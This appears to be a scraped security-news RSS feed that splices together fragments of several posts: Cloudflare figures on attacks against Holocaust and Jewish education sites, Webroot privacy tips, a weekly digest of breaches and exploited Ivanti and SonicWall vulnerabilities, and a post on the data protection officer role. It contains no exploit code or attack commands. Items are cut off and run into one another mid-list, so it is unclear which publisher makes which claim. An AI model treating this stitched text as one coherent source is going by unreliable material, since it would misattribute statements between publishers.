Muzeon faced significant cyberattacks that impacted their website’s performance and hindered operations before using Cloudflare.&lt;/p&gt;&lt;p&gt;As part of Project Galileo, Muzeon implemented Cloudflare's &lt;a href="https://www.cloudflare.com/en-gb/ddos/"&gt;&lt;u&gt;DDoS mitigation&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://www.cloudflare.com/en-gb/application-services/products/waf/"&gt;&lt;u&gt;Web Application Firewall (WAF)&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://www.cloudflare.com/application-services/products/dns/"&gt;&lt;u&gt;Managed DNS&lt;/u&gt;&lt;/a&gt;, and other services. These measures drastically reduced the attacks and allowed Muzeon to focus on its important mission of storytelling and preserving cultural heritage. &lt;/p&gt;&lt;p&gt;Cloudflare’s solutions not only protected their digital infrastructure but also freed up time for Muzeon to expand its interactive exhibits, ensuring they could continue sharing their essential work globally. You can read more about this case study &lt;a href="https://www.cloudflare.com/en-gb/case-studies/muzeon/"&gt;&lt;u&gt;here&lt;/u&gt;&lt;/a&gt;. &lt;/p&gt;

            &lt;h2&gt;Significant rise in antisemitism around the world&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#significant-rise-in-antisemitism-around-the-world"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;Following the October 7, 2023, &lt;a href="https://en.wikipedia.org/wiki/October_7_Hamas-led_attack_on_Israel"&gt;&lt;u&gt;Hamas-led attack&lt;/u&gt;&lt;/a&gt; on Israel, there has been a &lt;a href="https://en.wikipedia.org/wiki/Antisemitism_during_the_Israel%E2%80%93Hamas_war"&gt;&lt;u&gt;surge in global antisemitic incidents&lt;/u&gt;&lt;/a&gt;. In the &lt;a href="https://www.adl.org/resources/press-release/over-10000-antisemitic-incidents-recorded-us-oct-7-2023-according-adl"&gt;&lt;u&gt;U.S. alone&lt;/u&gt;&lt;/a&gt; there have been more than 10,000 antisemitic incidents from October 7, 2023 to September 24, 2024, representing an over 200-percent increase compared to the incidents reported during the same period a year before. As we’ve seen, the digital world is often a mirror to the real world. As a result, it is not surprising that websites dedicated to sharing information about the Holocaust, as well as Jewish memorial and education platforms, are now increasingly being targeted online. &lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;Cyberattacks against Jewish and Holocaust educational websites &lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#cyberattacks-against-jewish-and-holocaust-educational-websites"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;For the years 2020, 2021, and 2022, the number of cyberthreats targeting Holocaust and Jewish educational and memorial websites protected by Cloudflare was, on average, 736,339 malicious HTTP requests annually.&lt;/p&gt;&lt;p&gt;After the October 7 Hamas-led attack, cyberattacks skyrocketed. In 2023, the amount of blocked HTTP requests surged by 872% to 35.7 million compared to 2022. Most of these cyberattacks occurred after October 7, 2023. &lt;/p&gt;&lt;p&gt;In 2024, the number of blocked HTTP requests exceeded 47 million — representing a 30% increase compared to 2023. Over 3 out of every 100 HTTP requests towards Holocaust and Jewish memorial and education websites protected by Cloudflare were malicious and blocked. &lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/6p2NxGtyK3jDccp2G0MMvF/c7777304675f36f8cbe301f92a6dc5ec/BLOG-2659_3.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Cyber threats against Holocaust and Jewish memorial and educational websites by year&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Cyberattacks by quarter&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#cyberattacks-by-quarter"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;In the fourth quarter of 2023, the volume of malicious requests exceeded 27 million. Throughout the first three quarters of 2024, we saw a gradual decrease in the quantity of malicious requests. But in the fourth quarter of 2024, cyberattacks spiked by 33%, to 36 million requests, following the one-year anniversary of the October 7 assault.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/1YFVY3jTbMYsgbenBdor1P/6634fdf6edce5a5f3d44f34fdf017b3d/BLOG-2659_4.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Cyber threats against Holocaust and Jewish memorial and educational websites by quarter&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Cyberattacks by month&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#cyberattacks-by-month"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Breaking down the quarters into months, we can see an initial peak in October 2023 after the October 7 Hamas-led attack. The volume of cyberattacks remained elevated during November and December 2023.&lt;/p&gt;&lt;p&gt;Afterward, as we entered 2024, the quantity and percentage of cyberattacks against these websites significantly decreased. In November, over a third (34%) of all requests towards these websites were blocked, with over 36 million requests blocked that month alone.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5JGzGCm49GBBZMYfriSTpl/1f47b7b90bb5607461216fd2788c2f34/BLOG-2659_5.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Cyber threats against Holocaust and Jewish memorial and educational websites by month&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;Helping build a safer Internet and a better world&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#helping-build-a-safer-internet-and-a-better-world"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;On the International Holocaust Remembrance Day, we reflect on the importance of standing against both antisemitism and cyber threats — issues that have escalated since the October 7, 2023, Hamas-led attack. &lt;/p&gt;&lt;p&gt;At Cloudflare, we are unwavering in our commitment to create a safer, more inclusive Internet. The rise in antisemitism has made it even more critical to protect educational websites and communities from harmful cyber attacks. We invite everyone to join us in this fight. Even with our &lt;a href="https://www.cloudflare.com/en-gb/plans/"&gt;&lt;u&gt;free plan&lt;/u&gt;&lt;/a&gt;, we offer strong security and performance, ensuring that vital resources and websites remain safe and accessible. By working together, we can protect the lessons of history and foster a more secure digital world for all.&lt;/p&gt;</content:encoded><guid isPermaLink="false">4tycw0mGr6bpp3AbV17wEK</guid><category>DDoS</category><category>DDoS Reports</category><category>Attacks</category><category>Security</category><category>Network Services</category></item><item><title>6 ways to get the most from Data Privacy Week</title><link>https://www.webroot.com/blog/2025/01/27/6-ways-to-get-the-most-from-data-privacy-week/</link><description>&lt;p&gt;Data Privacy Week (Jan. 27-31) is an excellent opportunity to reflect on the importance of protecting one of your most valuable assets: your personal information.

&lt;p&gt;The post &lt;a href="https://www.webroot.com/blog/2025/01/27/6-ways-to-get-the-most-from-data-privacy-week/" rel="nofollow"&gt;6 ways to get the most from Data Privacy Week&lt;/a&gt; appeared first on &lt;a href="https://www.webroot.com/blog" rel="nofollow"&gt;Webroot Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;&lt;a href="https://www.staysafeonline.org/data-privacy-week" rel="noreferrer noopener" target="_blank"&gt;Data Privacy Week&lt;/a&gt; (Jan. 27-31) is an excellent opportunity to reflect on the importance of protecting one of your most valuable assets: your personal information. Whether you’re browsing online as&lt;ins&gt; a&lt;/ins&gt; consumer or running a business, data privacy is paramount in an environment where cyber threats can lurk around every corner.&lt;/p&gt;



&lt;p&gt;In the spirit of Data Privacy Week, here are six ideas to help you protect yourself—and your data:&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;1. Understand your level of risk&lt;/h2&gt;



&lt;p&gt;Get acquainted with the phrase &lt;a href="https://www.webroot.com/us/en/resources/glossary/what-is-personally-identifiable-information"&gt;personally identifiable information.&lt;/a&gt; This includes any data that can be used to identify you, and it ranges from your name and address to more sensitive information like &lt;del&gt;  &lt;/del&gt;health and financial records. Here are some common examples:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Health data&lt;/strong&gt;: Information stored in a patient portal, online pharmacy, or health insurance website.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Financial data&lt;/strong&gt;: Details of your bank account, 401K fund, or IRA.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Apps&lt;/strong&gt;: Data collected by various applications you use. This information can range from your current location to previous purchasing habits.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Social media&lt;/strong&gt;: Information you share on platforms like Facebook, Twitter, and Instagram.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Knowing what kinds of personal data you have out there is the first step toward protecting it.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;2. Learn the basics of data privacy self-defense&lt;/h2&gt;



&lt;p&gt;Protecting your data doesn&amp;#8217;t have to be complicated. Here are some basic steps you can take to &lt;a href="https://www.webroot.com/blog/2024/10/17/10-steps-to-safeguarding-your-privacy-online/"&gt;safeguard your privacy&lt;/a&gt;:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Create secure passwords&lt;/strong&gt;: Use a combination of letters, numbers, and special characters.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Use multifactor identification&lt;/strong&gt;: Add an extra layer of security to your accounts by using a password combined with a code sent to their phone or a fingerprint. &lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Limit the number of cookies you accept&lt;/strong&gt;: Be selective about which websites can track your activity.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Beware of public Wi-Fi&lt;/strong&gt;: Avoid accessing sensitive information on unsecured networks.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Use a &lt;/strong&gt;&lt;a href="https://www.webroot.com/blog/2022/01/25/the-benefits-of-using-a-vpn-on-your-home-network/"&gt;&lt;strong&gt;virtual private network, or VPN&lt;/strong&gt;&lt;/a&gt;: Encrypt your internet connection to protect your data.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Keep software up to date&lt;/strong&gt;: Regular updates can protect you from security vulnerabilities.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2 class="wp-block-heading"&gt;3. Update your privacy settings&lt;/h2&gt;



&lt;p&gt;Take some time to review the privacy settings on the apps, devices, or websites you use most often. You might be surprised at what you find. The nonprofit National Cybersecurity Alliance has compiled a &lt;a href="https://www.staysafeonline.org/articles/manage-your-privacy-settings" rel="noreferrer noopener" target="_blank"&gt;comprehensive list&lt;/a&gt; of popular sites’ privacy pages to get you started.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;4. Arm yourself with antivirus protection&lt;/h2&gt;



&lt;p&gt;An effective antivirus program is essential for protecting your devices from &lt;a href="https://www.webroot.com/us/en/resources/tips-articles/what-is-malware-protection"&gt;malware&lt;/a&gt; and other threats. Look for features such as real-time scanning, automatic updates, and comprehensive protection against various types of malware. A product like &lt;a href="https://www.webroot.com/us/en"&gt;Webroot&lt;/a&gt; offers a variety of antivirus solutions to keep your data safe. Webroot even offers a &lt;a href="https://www.webroot.com/us/en/home/products/helpmechoose"&gt;product selection tool&lt;/a&gt; that can help you find a solution tailored to your unique needs.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;5. Find an encrypted data backup product&lt;/h2&gt;



&lt;p&gt;Backing up your data is crucial, but it&amp;#8217;s equally important to ensure that those backups are secure. An encrypted data backup solution like &lt;a href="https://www.carbonite.com/" rel="noreferrer noopener" target="_blank"&gt;Carbonite&lt;/a&gt; can protect your data from unauthorized access. Carbonite’s secure, always-on backup ensures that you won’t lose important, irreplaceable files due to accidental deletion or device malfunction.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;6. Take in a movie&lt;/h2&gt;



&lt;p&gt;After all that hard work learning about data privacy, it’s time to reward yourself by doing something fun. Hop on the couch and watch a movie that delves into the topic. Here are some suggestions from the nonprofit group &lt;a href="https://er.educause.edu/blogs/2017/1/things-to-do-during-data-privacy-month" rel="noreferrer noopener" target="_blank"&gt;Educause&lt;/a&gt;:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Terms and Conditions May Apply&lt;/li&gt;



&lt;li&gt;Citizen Four&lt;/li&gt;



&lt;li&gt;Code 2600&lt;/li&gt;



&lt;li&gt;Gattaca&lt;/li&gt;



&lt;li&gt;Minority Report&lt;/li&gt;



&lt;li&gt;1984&lt;/li&gt;

&lt;strong&gt;TOP ATTACKS AND BREACHES&lt;/strong&gt;
&lt;ul&gt;
 	&lt;li&gt;Stark Aerospace, a US-based manufacturer specializing in missile systems and UAVs, contractor of the US Military and the Department of Defense (DoD), has been &lt;a href="https://cybernews.com/security/stark-aerospace-inc-ransomware-attack-weapons-defense-contractor/"&gt;targeted&lt;/a&gt; by the INC ransomware group. The attackers claim to have exfiltrated 4TB of data, including design documentation, source codes, firmware for various UAVs, contracts with the DoD, supply chain information, and personal data of company instructors.&lt;/li&gt;
&lt;/ul&gt;
&lt;p style="padding-left: 40px;"&gt;&lt;em&gt;Check Point Threat Emulation and Harmony Endpoint provide protection against this threat &lt;/em&gt;&lt;em&gt;(&lt;/em&gt;&lt;em&gt;Ransomware.Wins.INC.A&lt;/em&gt;&lt;em&gt;)&lt;/em&gt;&lt;/p&gt;

&lt;ul&gt;
 	&lt;li&gt;TalkTalk, a UK telecommunications company, has &lt;a href="https://www.bleepingcomputer.com/news/security/talktalk-investigates-breach-after-data-for-sale-on-hacking-forum/"&gt;suffered&lt;/a&gt; a data breach that resulted in the exposure of customer information, including names, email addresses, IP addresses, and phone numbers. A threat actor named &amp;#8220;b0nd&amp;#8221; claimed on a hacking forum to have stolen data affecting approximately 18.8 million current and former customers.&lt;/li&gt;
 	&lt;li&gt;ICICI Bank, an Indian multinational bank, has allegedly been a victim of a cyber-attack &lt;a href="https://cybersecuritynews.com/icici-bank-data-breach/"&gt;claimed&lt;/a&gt; by the BASHE ransomware group (also known as APT73 or Eraleig). The group has claimed to breach the bank’s database, and set an initial ransom deadline of January 24, 2025, threatening to expose sensitive data. ICICI Bank has not confirmed the breach, and legitimacy of the claims is being questioned with the deadline pushed to January 31, with no files leaked.&lt;/li&gt;
 	&lt;li&gt;Singapore-based cryptocurrency platform Phemex has &lt;a href="https://therecord.media/69-million-stolen-cyberattack-crypto-platform-phemex"&gt;experienced&lt;/a&gt; a cyberattack resulting in the theft of over $69 million in digital assets, including ETH, Bitcoin, and Binance Coin. The company has paused certain operations and is manually reviewing withdrawal requests while working on a compensation plan for affected users.&lt;/li&gt;
 	&lt;li&gt;Conduent, a major American business services provider and government contractor, has &lt;a href="https://www.bleepingcomputer.com/news/security/conduent-confirms-cybersecurity-incident-behind-recent-outage/"&gt;confirmed&lt;/a&gt; that a recent service outage was due to a cybersecurity incident. The disruption affected clients across multiple US states, including the Wisconsin Department of Children and Families.&lt;/li&gt;
 	&lt;li&gt;Rostelecom, a major Russian telecommunications provider, is &lt;a href="https://tass.ru/ekonomika/22933081"&gt;investigating&lt;/a&gt; a suspected cyberattack on one of its contractors after the hacker group Silent Crow claimed to have leaked company&amp;#8217;s data. The leaked information reportedly includes thousands of customer emails and phone numbers. The contractor is responsible for maintaining Rostelecom’s corporate website and procurement portal, which were targeted in the attack. Initial findings suggest no leak of highly sensitive personal data.&lt;/li&gt;
 	&lt;li&gt;West Virginia&amp;#8217;s Harrison County school district has &lt;a href="https://www.harcoboe.net/article/1982412"&gt;disclosed&lt;/a&gt; that it had suffered a cyber-attack. According to the district, it had shut down its network upon discovering the attack. The district has not provided information on whether any data was exfiltrated.&lt;/li&gt;
&lt;/ul&gt;
&lt;strong&gt;VULNERABILITIES AND PATCHES&lt;/strong&gt;
&lt;ul&gt;
 	&lt;li&gt;CISA and FBI have &lt;a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-022a"&gt;identified&lt;/a&gt; exploitation of four vulnerabilities in Ivanti Cloud Service Appliances (CSA): an administrative bypass vulnerability (CVE-2024-8963), an SQL injection vulnerability (CVE-2024-9379); and remote code execution vulnerabilities (CVE-2024-8190 and CVE-2024-9380). Threat actors leveraged two distinct exploit chains to gain initial access, execute remote code, exfiltrate credentials, and implant webshells on victim networks. Affected versions include Ivanti CSA 4.6 (end-of-life) and earlier 5.0.1 versions. The vulnerabilities were actively exploited as zero days and were added to CISA’s Known Exploited Vulnerabilities Catalog.&lt;/li&gt;
&lt;/ul&gt;
&lt;p style="padding-left: 40px;"&gt;&lt;em&gt;Check Point IPS provides protection against this threat &lt;/em&gt;&lt;em&gt;(Ivanti Cloud Services Appliance Path Traversal (CVE-2024-8963), Ivanti Cloud Services Appliance SQL Injection (CVE-2024-9379), &lt;/em&gt;&lt;em&gt;Ivanti Cloud Services Appliance Command Injection (CVE-2024-8190), &lt;/em&gt;&lt;em&gt;Ivanti Cloud Services Appliance Command Injection (CVE-2024-9380))&lt;/em&gt;&lt;/p&gt;

&lt;ul&gt;
 	&lt;li&gt;SonicWall has &lt;a href="https://www.bleepingcomputer.com/news/security/sonicwall-warns-of-sma1000-rce-flaw-exploited-in-zero-day-attacks/"&gt;disclosed&lt;/a&gt; a critical deserialization vulnerability (CVE-2025-23006) in SMA1000 Appliance Management Console (AMC) and Central Management Console (CMC). The flaw allows remote unauthenticated attackers to execute arbitrary OS commands. It has reportedly been exploited as a zero-day in attacks, targeting firmware versions up to 12.4.3-02804.&lt;/li&gt;

 	&lt;li&gt;Check Point has &lt;a href="https://blog.checkpoint.com/research/exploring-q4-2024-brand-phishing-trends-microsoft-remains-the-top-target-as-linkedin-makes-a-comeback/"&gt;released&lt;/a&gt; its Brand Phishing Report for Q4 2024, highlighting that Microsoft continues to be the most impersonated brand in phishing attacks, accounting for a significant percentage of attempts. Notably, LinkedIn has reentered the top ten list, indicating a resurgence in phishing campaigns targeting social media platforms. The technology sector remains the most imitated industry, followed by social networks and banking.&lt;/li&gt;
 	&lt;li&gt;FBI has &lt;a href="https://www.ic3.gov/PSA/2025/PSA250123"&gt;issued&lt;/a&gt; a warning about North Korean IT workers exploiting remote work opportunities to steal source code and extort employers. These state-sponsored individuals deceive companies by posing as independent contractors and using their access to extract information. The FBI identifies these actions as part of a larger effort to generate revenue for the North Korean government.&lt;/li&gt;
 	&lt;li&gt;Researchers have &lt;a href="https://www.sentinelone.com/blog/hellcat-and-morpheus-two-brands-one-payload-as-ransomware-affiliates-drop-identical-code/"&gt;identified&lt;/a&gt; ransomware affiliates Hellcat and Morpheus deploying identical malicious payloads despite operating under different branding. Both groups employ sophisticated techniques for data encryption and exfiltration, targeting organizations across multiple industries. The findings suggest a shared codebase or toolkit used by these affiliates.&lt;/li&gt;

We recognise the visible and consumer-facing aspects of the General Data Protection Regulation in our everyday lives – when consumers exercise their right to withdraw consent to their data being processed via ‘opt out’ or ‘unsubscribe’ buttons, for example. What’s less evident is whether organisations are keeping their practices fully up to date and in line with the GDPR and other applicable data protection laws. For instance: So, how sure are you that your organisation is fully compliant with the relevant data protection legislation? In this blog ‘Once compliant’ does not mean ‘still compliant’ &lt;/p&gt;
&lt;p&gt;The post &lt;a href="https://www.itgovernance.co.uk/blog/what-it-takes-to-be-your-organisations-dpo-or-data-privacy-lead"&gt;What It Takes to Be Your Organisation’s DPO or Data Privacy Lead&lt;/a&gt; appeared first on &lt;a href="https://www.itgovernance.co.uk/blog"&gt;IT Governance Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;‘GDPR’ has become a familiar term.&lt;/p&gt;



&lt;p&gt;We recognise the visible and consumer-facing aspects of the &lt;a href="https://www.itgovernance.co.uk/data-protection-dpa-and-eu-data-protection-regulation" rel="noreferrer noopener" target="_blank"&gt;General Data Protection Regulation&lt;/a&gt; in our everyday lives – when consumers exercise their right to withdraw consent to their data being processed via ‘opt out’ or ‘unsubscribe’ buttons, for example.&lt;/p&gt;



&lt;p&gt;What’s less evident is whether organisations are keeping their practices fully up to date and in line with the GDPR and other applicable data protection laws. For instance:&lt;/p&gt;



&lt;ul class="wp-block-list li-spaced"&gt;
&lt;li&gt;Since adding unsubscribe buttons, those same organisations may have purchased marketing email lists without confirming the &lt;a href="https://www.itgovernance.co.uk/blog/how-organisations-are-failing-to-process-personal-data-lawfully-under-the-gdpr" rel="noreferrer noopener" target="_blank"&gt;lawful basis&lt;/a&gt; under which the personal data was collected and sold.&lt;/li&gt;



&lt;li&gt;Where the organisation has bought a marketing list, did it screen that list against its list of people who have previously opted out, so that it removes those individuals from the purchased list before starting to market to them?&lt;/li&gt;



&lt;li&gt;Since the EU GDPR was adopted in 2016 and became enforceable from 2018, we’ve had the &lt;a href="https://www.itgovernance.co.uk/dpa-2018" rel="noreferrer noopener" target="_blank"&gt;DPA (Data Protection Act) 2018&lt;/a&gt; and Brexit in the UK.&lt;/li&gt;



&lt;li&gt;More than 20 articles have been withdrawn from the EU GDPR to make the UK GDPR, and the DPA 2018 has been amended to be read in conjunction with the UK GDPR.&lt;/li&gt;
&lt;/ul&gt;







&lt;p&gt;So, how sure are you that your organisation is fully compliant with the relevant data protection legislation?&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading"&gt;In this blog&lt;/h2&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Once-compliant-does-not-mean-still-compliant"&gt;‘Once compliant’ does not mean ‘still compliant’&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Data-protection-is-international"&gt;Data protection is international&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Guiding-others-towards-compliance"&gt;Guiding others towards compliance&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Data-breach-management"&gt;Data breach management&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Knowledge-skills-and-competence"&gt;Knowledge, skills and competence&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Once-compliant-does-not-mean-still-compliant"&gt;‘Once compliant’ does not mean ‘still compliant’&lt;/h2&gt;



&lt;p&gt;If you’re anything less than 100% sure, there’s a fair chance that someone, somewhere, has assumed that nothing has changed internally or within the law.&lt;/p&gt;



&lt;p&gt;Just because you sought expert opinion on the matter a few years ago doesn’t mean you’re in the clear. ‘Once compliant’ doesn’t mean ‘still compliant’.&lt;/p&gt;



&lt;p&gt;Previous decisions made – like not having to appoint a &lt;a href="https://www.itgovernance.co.uk/data-protection-officer-dpo-under-the-gdpr" rel="noreferrer noopener" target="_blank"&gt;DPO (data protection officer)&lt;/a&gt;, or not needing to conduct a &lt;a href="https://www.itgovernance.co.uk/privacy-impact-assessment-pia" rel="noreferrer noopener" target="_blank"&gt;DPIA (data protection impact assessment)&lt;/a&gt; – need to be kept under review.&lt;/p&gt;



&lt;p&gt;Circumstances can change, as can guidance from the ICO (Information Commissioner’s Office), EDPB (European Data Protection Board), and similar bodies. Organisations should make someone responsible for monitoring such changes.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Data-protection-is-international"&gt;Data protection is international&lt;/h2&gt;



&lt;p&gt;The EU GDPR, UK GDPR and DPA 2018 aren’t the only laws you may need to comply with.&lt;/p&gt;



&lt;p&gt;Data protection laws exist in almost every country and are relevant wherever you do business. You can design your systems and processes such that they meet all these legal requirements. A management system like an &lt;a href="https://www.itgovernance.co.uk/iso27001" rel="noreferrer noopener" target="_blank"&gt;ISO 27001 ISMS&lt;/a&gt; or an &lt;a href="https://www.itgovernance.co.uk/iso-27701" rel="noreferrer noopener" target="_blank"&gt;ISO 27701 PIMS&lt;/a&gt; can significantly help with this.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;But compliance requires clarity.&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;If you don’t understand the topics in detail, you risk conflating one standard or regulation with another, causing you to lose out on multiple fronts.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;h3 class="wp-block-heading"&gt;Conflicting laws&lt;/h3&gt;



&lt;p&gt;You’ll see few conflicts in Europe, as the EU GDPR was designed to integrate with EU laws. And post-Brexit, differences in UK and EU data protection law have remained small (though not non-existent, as discussed earlier).&lt;/p&gt;



&lt;p&gt;But the further afield you go, the more problems you might run into. I experienced this when doing some GDPR work for a large Saudi Arabian organisation – a national law prevented it from being allowed to report data breaches with a risk to data subjects outside the country. And where laws compete, the strictest law always applies.&lt;/p&gt;



&lt;p&gt;DPOs and data privacy leads need to know how to deal with situations like that. They’ll have to find a workaround like publishing a statement on the website along the lines of: ‘Please be aware that you might want to change your password at your earliest opportunity.’&lt;/p&gt;



&lt;p&gt;Being able to clearly distinguish one regulation from another to unpick any problems is a key skill for a DPO.&lt;/p&gt;

&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Guiding-others-towards-compliance"&gt;Guiding others towards compliance&lt;/h2&gt;



&lt;p&gt;Another key way in which the DPO (or privacy lead) can help give the organisation clarity into its data – and compliance – is by asking the right people the right questions.&lt;/p&gt;



&lt;p&gt;The DPO’s role isn’t to ‘do’ compliance themselves, but to &lt;em&gt;monitor&lt;/em&gt; compliance, as well as guide others – especially business line managers – in taking the right actions. So, ask questions around what personal data they’re processing, and why and how they’re processing it. You could also visualise this information in a &lt;a href="https://www.itgovernance.co.uk/gdpr-data-mapping" rel="noreferrer noopener" target="_blank"&gt;data flow map&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;Until you get clear answers to these questions, you won’t be able to get clarity on:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Lawful basis&lt;/li&gt;



&lt;li&gt;The risks of processing&lt;/li&gt;



&lt;li&gt;Whether a DPIA is needed&lt;/li&gt;



&lt;li&gt;Necessary technical and organisational measures&lt;/li&gt;



&lt;li&gt;Information needed for your &lt;a href="https://www.itgovernance.co.uk/blog/records-of-processing-activities-ropas-simplifying-gdpr-compliance" rel="noreferrer noopener" target="_blank"&gt;ROPAs (records of processing activities)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;The most reliable way to obtain all this information (and more!) – and ensure ongoing compliance – is to appoint a data privacy lead.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Data-breach-management"&gt;Data breach management&lt;/h2&gt;



&lt;p&gt;The value of having someone trained in data protection and privacy isn’t just apparent during business-as-usual times, when the DPO helps in the decision-making process through objective assessment and, where required, using tools like data flow maps and DPIAs.&lt;/p&gt;



&lt;p&gt;The DPO or privacy lead also plays a pivotal role if a &lt;a href="https://www.itgovernance.co.uk/blog/how-long-do-you-have-to-report-a-data-breach" rel="noreferrer noopener" target="_blank"&gt;data breach&lt;/a&gt; occurs. They can assess the risks, offer practical advice – including about what follow-up action is needed to contain and mitigate the breach – and report it to the ICO if required.&lt;/p&gt;



&lt;p&gt;To be effective in both business-as-usual matters and during business disruption, the DPO or privacy lead must secure the support of senior management – not just to have sufficient resources at their disposal, but to be able to introduce changes where needed.&lt;/p&gt;



&lt;p&gt;This includes implementing lessons learned following a data breach.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Knowledge-skills-and-competence"&gt;Knowledge, skills and competence&lt;/h2&gt;



&lt;p&gt;Experience will stand a DPO in good stead, but isn’t a substitute for competence.&lt;/p&gt;



&lt;p&gt;Apart from having a good grasp of the relevant regulations and excellent fact-checking abilities, a DPO will need to follow processes and be able to handle people well. Few people like change, so being able to convince them of the merits of those changes is an essential skill.&lt;/p&gt;



&lt;p&gt;As the DPO or privacy lead, you’ll be the go-to person, the ‘safe pair of hands’, the trusted adviser and the mediator. You’re not just going to be following procedures with care and caution – you’ll have a wide range of stakeholders to deal with.&lt;/p&gt;



&lt;p&gt;&lt;a href="https://www.itgovernance.co.uk/shop/product/certified-data-protection-officer-c-dpo-training-course" rel="noreferrer noopener" target="_blank"&gt;Effective DPO training&lt;/a&gt; covers the ‘how to’ part of the role as well as the ‘what and when’.&lt;/p&gt;



&lt;p&gt;At IT Governance, we give guidance on what it means to be responsible and accountable in a DPO or data privacy leadership role. That’s what makes the difference between someone who has been handed a task and someone who is up to the job.&lt;/p&gt;



&lt;p&gt;And remember: how a person performs in their role ultimately determines their prospects and the commercial wellbeing of their organisation.&lt;/p&gt;

The threat actors compromised company’s Amazon S3 cloud storage, stealing guests&amp;#8217; personal information and reservations for major hotel brands like Marriott, Hilton, and Hyatt.&lt;/li&gt;
&lt;li&gt;Global publisher and provider of educational materials Scholastic has been allegedly &lt;a href="https://www.dailydot.com/debug/furry-hacks-scholastic-8-million-records-stolen/"&gt;breached&lt;/a&gt;, leading to theft of data related to its US customers and “education contacts”. The breach occurred through an employee portal, exposing personal information and 4,247,768 unique email addresses.&lt;/li&gt;
&lt;li&gt;The government of West Haven city in Connecticut &lt;a href="https://therecord.media/west-haven-connecticut-city-government-cyberattack"&gt;underwent&lt;/a&gt; a cyberattack leading to the temporary shutdown of their entire IT infrastructure.

